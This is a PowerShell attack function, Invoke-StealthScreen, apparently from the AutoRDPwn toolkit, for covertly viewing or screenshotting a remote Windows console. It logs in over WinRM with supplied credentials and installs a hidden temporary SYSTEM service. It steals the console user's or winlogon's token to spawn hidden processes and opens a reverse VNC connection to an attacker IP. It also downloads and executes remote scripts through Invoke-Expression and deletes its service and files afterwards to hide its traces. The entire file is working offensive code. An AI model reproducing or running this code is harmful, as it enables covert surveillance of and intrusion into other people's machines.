function Invoke-StealthScreen {
    Param(
        [Parameter(Mandatory)] $Target,
        [Parameter(Mandatory)] $User,
        [Parameter(Mandatory)] $Pass,
        $Mode = 'view',
        $AttackerIP,
        $Port = 5500,
        $Password = 'AutoRDPwn',
        $Path = 'C:\Windows\Temp'
    )

    $sec = ConvertTo-SecureString $Pass -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential($User, $sec)
    $s = New-PSSession -ComputerName $Target -Credential $cred -Authentication Negotiate
    if (!$s) { Write-Host "[!] WinRM session failed" -ForegroundColor Red; return }

    if ($Mode -eq 'view') {
        if (!$AttackerIP) { Write-Host "[!] -AttackerIP required for view mode" -ForegroundColor Red; Remove-PSSession $s; return }

        # Handler: UltraVNC viewer in listening mode (reuse a running instance, never double-bind)
        $viewer = Get-Process VNCViewer -ErrorAction SilentlyContinue
        if (!$viewer) {
            $scriptdir = $PSScriptRoot
            Push-Location $env:TEMP
            try {
                if ($scriptdir -and (Test-Path (Join-Path $scriptdir 'Invoke-VNCViewer.ps1'))) {
                    & (Join-Path $scriptdir 'Invoke-VNCViewer.ps1')
                } else {
                    Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-VNCViewer.ps1')
                }
            } finally { Pop-Location }
            Start-Process -FilePath "$env:TEMP\VNCViewer.exe" -ArgumentList "/listen $Port /password $Password /nohotkeys /autoacceptincoming" | Out-Null
        }
        Write-Host "[+] Handler listening on ${AttackerIP}:$Port - spawning hidden server on target console session (logon screen safe)" -ForegroundColor Blue

        # Server side pushed to target, executed as SYSTEM service -> session 1 via winlogon token theft
        $vncps = Get-Content (Join-Path $PSScriptRoot 'Invoke-VNCServer.ps1') -Raw -ErrorAction SilentlyContinue
        if (!$vncps) { $vncps = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-VNCServer.ps1') }
        $vncps += "`r`nInvoke-Vnc -ConType reverse -IpAddress $AttackerIP -Port $Port -Password $Password`r`n"

        $bytes = [System.Text.Encoding]::Unicode.GetBytes($vncps)
        $vncb64 = [System.Convert]::ToBase64String($bytes)
        $engine = @"
`$b64 = '$vncb64'
`$raw = [System.Convert]::FromBase64String(`$b64)
`$txt = [System.Text.Encoding]::Unicode.GetString(`$raw)
Set-Content -Path 'C:\Windows\Temp\vnc.ps1' -Value `$txt -Force
Start-Process -FilePath 'powershell.exe' -ArgumentList '-nop','-w hidden','-f','C:\Windows\Temp\vnc.ps1' -WindowStyle Hidden
"@

        Set-Content -Path "$env:TEMP\engine.ps1" -Value $engine -Force
        $engineTxt = Get-Content "$env:TEMP\engine.ps1" -Raw
        invoke-command -session $s -scriptblock { Param($et) Set-Content -Path 'C:\Windows\Temp\ss.ps1' -Value $et -Force } -ArgumentList $engineTxt

        invoke-command -session $s -scriptblock {
            New-Service -Name 'WinSessionSvc' -BinaryPathName 'powershell.exe -nop -w hidden -f C:\Windows\Temp\ss.ps1' -StartupType Manual -ErrorAction SilentlyContinue | Out-Null
            Start-Service -Name 'WinSessionSvc' -ErrorAction SilentlyContinue
        }

        Start-Sleep -Seconds 20
        invoke-command -session $s -scriptblock {
            Stop-Service -Name 'WinSessionSvc' -Force -ErrorAction SilentlyContinue
            (Get-Service -Name 'WinSessionSvc' -ErrorAction SilentlyContinue) | ForEach-Object { sc.exe delete WinSessionSvc | Out-Null }
            Remove-Item 'C:\Windows\Temp\ss.ps1','C:\Windows\Temp\vnc.ps1' -Force -ErrorAction SilentlyContinue
        }
        Write-Host "[+] Spawn attempt complete - check the viewer window" -ForegroundColor Green
    }

    if ($Mode -eq 'shot') {
        Write-Host "[+] Capturing target console screen.." -ForegroundColor Blue

        $cmd = "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; " +
               "New-Item -ItemType Directory -Path '$Path' -Force | Out-Null; " +
               "`$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; " +
               "`$bmp = New-Object System.Drawing.Bitmap `$b.Width, `$b.Height; " +
               "`$g = [System.Drawing.Graphics]::FromImage(`$bmp); " +
               "`$g.CopyFromScreen(0, 0, 0, 0, `$bmp.Size); " +
               "`$bmp.Save('$Path\shota.png'); " +
               "`$g.Dispose(); `$bmp.Dispose()"
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
        $enc = [System.Convert]::ToBase64String($bytes)

        $engine = @"
`$b64 = '$enc'
`$raw = [System.Convert]::FromBase64String(`$b64)
`$txt = [System.Text.Encoding]::Unicode.GetString(`$raw)
Set-Content -Path 'C:\Windows\Temp\shotc.ps1' -Value `$txt -Force
`$def = @'
using System;
using System.Runtime.InteropServices;
public class WTS {
    [DllImport("kernel32.dll")] public static extern UInt32 WTSGetActiveConsoleSessionId();
    [DllImport("advapi32.dll", SetLastError=true)] public static extern bool WTSQueryUserToken(UInt32 sessionId, out IntPtr Token);
    [DllImport("advapi32.dll", SetLastError=true)] public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
    [DllImport("advapi32.dll", SetLastError=true)] public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)] public static extern bool CreateProcessAsUserW(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)] public struct STARTUPINFO {
        public int cb; public string lpReserved; public string lpDesktop; public string lpTitle;
        public int dwX; public int dwY; public int dwXSize; public int dwYSize;
        public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags;
        public ushort wShowWindow; public ushort cbReserved2; public IntPtr lpReserved2;
        public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
    [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION {
        public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId; }
}
'@
Add-Type -TypeDefinition `$def
`$sessId = [WTS]::WTSGetActiveConsoleSessionId()
`$tok = [IntPtr]::Zero
if ([WTS]::WTSQueryUserToken(`$sessId, [ref]`$tok)) {
    [WTS]::DuplicateTokenEx(`$tok, 0x1F01FF, [IntPtr]::Zero, 2, 1, [ref]`$tok) | Out-Null
} else {
    `$wl = Get-Process winlogon | Where-Object { `$_.SessionId -eq `$sessId } | Select-Object -First 1
    if (`$wl) {
        `$h = [WTS]::OpenProcess(0x0400, `$false, `$wl.Id)
        `$tok = [IntPtr]::Zero
        if (`$h -ne [IntPtr]::Zero) {
            `$r = [WTS]::OpenProcessToken(`$h, 0x1F01FF, [ref]`$tok)
        }
    }
}
`$si = New-Object WTS+STARTUPINFO
`$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf(`$si)
`$si.lpDesktop = 'WinSta0\Default'
`$pi = New-Object WTS+PROCESS_INFORMATION
`$cmdline = 'powershell.exe -nop -w hidden -e ' + `$b64
`$ok = [WTS]::CreateProcessAsUserW(`$tok, `$null, `$cmdline, [IntPtr]::Zero, [IntPtr]::Zero, `$false, 0x08000000, [IntPtr]::Zero, `$null, [ref]`$si, [ref]`$pi)
if (!`$ok) { Write-Output ('CREATE FAILED: ' + [Runtime.InteropServices.Marshal]::GetLastWin32Error()) } else { Write-Output ('SPAWNED PID ' + `$pi.dwProcessId) }
"@

        Set-Content -Path "$env:TEMP\engine.ps1" -Value $engine -Force
        $engineTxt = Get-Content "$env:TEMP\engine.ps1" -Raw
        $result = invoke-command -session $s -scriptblock {
            Param($et)
            Set-Content -Path 'C:\Windows\Temp\ss.ps1' -Value $et -Force
            New-Service -Name 'WinShotSvc' -BinaryPathName 'powershell.exe -nop -w hidden -f C:\Windows\Temp\ss.ps1' -StartupType Manual -ErrorAction SilentlyContinue | Out-Null
            Start-Service -Name 'WinShotSvc' -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 18
            Stop-Service -Name 'WinShotSvc' -Force -ErrorAction SilentlyContinue
            sc.exe delete WinShotSvc | Out-Null
            if (Test-Path 'C:\Windows\Temp\shota.png') { (Get-Item 'C:\Windows\Temp\shota.png').Length } else { 'NOFILE' }
        } -ArgumentList $engineTxt
        Write-Host "[i] Service result: $result"

        if ($result -and $result -ne 'NOFILE') {
            invoke-command -session $s -scriptblock {
                $ms = New-Object IO.MemoryStream
                $ms.Write([IO.File]::ReadAllBytes('C:\Windows\Temp\shota.png'), 0, (Get-Item 'C:\Windows\Temp\shota.png').Length)
                [Convert]::ToBase64String($ms.ToArray())
            } | ForEach-Object {
                [IO.File]::WriteAllBytes("$env:TEMP\stealthshot.png", [Convert]::FromBase64String($_))
            }
            Write-Host "[+] Screen captured: $env:TEMP\stealthshot.png" -ForegroundColor Green
            Invoke-Item "$env:TEMP\stealthshot.png"
        } else {
            Write-Host "[!] No screenshot arrived - check the target session state" -ForegroundColor Red
        }
    }

    Remove-PSSession $s
}
